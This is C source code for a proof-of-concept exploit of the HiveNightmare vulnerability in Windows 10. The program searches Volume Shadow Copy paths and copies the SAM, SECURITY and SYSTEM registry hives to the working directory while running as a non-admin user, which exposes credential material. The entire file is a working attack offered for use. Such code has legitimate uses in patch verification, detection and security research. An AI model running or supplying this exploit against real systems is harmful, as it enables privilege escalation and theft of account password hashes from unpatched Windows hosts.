// Exploit for HiveNightmare, discovered by @jonasLyk, PoC by @GossiTheDog, powered by Porgs
// Allows you to read SAM, SYSTEM and SECURITY registry hives in Windows 10 from non-admin users
// * Win10 1809 and above are vulnerable.

#include <windows.h>
#include <stdio.h>

#define NUMBER_SNAPSHOTS 10

BOOL main() {
    const char* pathShadow = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%i\\Windows\\System32\\config\\%s";
    const char* targetFiles[] = {
        "SAM",
        "SECURITY",
        "SYSTEM",
    };

    printf("\n[-] HiveNightmare - dump registry hives as non-admin users\n");

    char* fullPathShadow = (char*)calloc(MAX_PATH, sizeof(char*));
    if (fullPathShadow == NULL) {
        printf("[x] Memory error !\n");
        return TRUE;
    }
    int valideNumberVolume = 1;
    for (int targetFilesNb = 0; targetFilesNb < sizeof(targetFiles) / sizeof(char*); targetFilesNb++) {
        
        HANDLE hFile = INVALID_HANDLE_VALUE;
        HANDLE hAppend;
        DWORD  dwBytesRead, dwBytesWritten, dwPos;
        BYTE   buff[4096];


        for (; valideNumberVolume < NUMBER_SNAPSHOTS && hFile == INVALID_HANDLE_VALUE; valideNumberVolume++) {
            sprintf_s(fullPathShadow, MAX_PATH, pathShadow, valideNumberVolume, targetFiles[targetFilesNb]);
            hFile = CreateFileA(fullPathShadow, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        }
        if (valideNumberVolume == NUMBER_SNAPSHOTS || hFile == INVALID_HANDLE_VALUE) {
            printf("[x] Could not open %s :( Is System Protection not enabled or vulnerability fixed?\n", targetFiles[targetFilesNb]);
            printf("[i] Note currently hardcoded to look for first %i VSS snapshots only - list snapshots with vssadmin list shadows\n", NUMBER_SNAPSHOTS);
            free(fullPathShadow);
            return TRUE;
        }

        hAppend = CreateFileA(targetFiles[targetFilesNb], FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hAppend == INVALID_HANDLE_VALUE) {
            printf("[x] Could not write %s - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n", targetFiles[targetFilesNb]);
            free(fullPathShadow);
            return TRUE;
        }
        while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
            && dwBytesRead > 0) {
            dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
            LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
            WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
            UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
        }
        CloseHandle(hFile);
        CloseHandle(hAppend);

        printf("\t[-] %s hive written out to current working directory\n", targetFiles[targetFilesNb]);
        valideNumberVolume--;
    }
    free(fullPathShadow);
    printf("\n[*] Done, you should be able to find hive dump files in current working directory as SAM, SECURITY and SYSTEM\n");
    return FALSE;
}